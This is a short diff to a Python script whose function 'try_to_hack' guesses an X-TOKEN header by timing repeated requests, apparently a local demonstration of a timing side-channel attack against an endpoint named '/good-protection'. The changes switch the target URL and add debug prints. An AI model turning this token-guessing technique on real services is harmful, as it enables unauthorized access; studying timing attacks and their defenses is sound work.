@@ -7,7 +7,9 @@ import requests
 
 from operator import itemgetter
 
-URL = "http://localhost:8000"
+# URL = "http://localhost:8000"
+URL = "http://localhost:8000/good-protection"
+
 N = 100
 TOKEN_SIZE = 5
 
@@ -28,9 +30,12 @@ def try_to_hack(characters):
     for i in range(N):
         before = time.perf_counter()
         result = requests.get(URL, headers={'X-TOKEN': characters})
+        if result.status_code == 403 and i % 100 == 0:
+            print(result.content)
         after = time.perf_counter()
 
         if result.status_code == 200:
+            print(result.content)
             raise PasswordFound(characters)
         elif result.status_code != 403:
             raise Exception(result, result.status_code)
